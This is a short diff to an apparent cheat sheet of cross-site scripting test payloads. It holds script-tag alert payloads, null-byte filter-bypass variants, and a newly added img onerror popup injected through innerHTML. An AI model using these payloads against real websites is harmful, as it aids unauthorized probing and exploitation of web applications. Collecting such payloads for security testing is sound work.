@@ -32,3 +32,8 @@ div.innerHTML = '<script deferred>alert("XSS");</script>';
 <script>alert(1)</script>
 %00<script>alert(1)</script>
 %00<script>alert(1);</script>
+
+
+Blank Popup:
+document.createElement('div').innerHTML = "<img src="aaa" onerror=alert()>
+
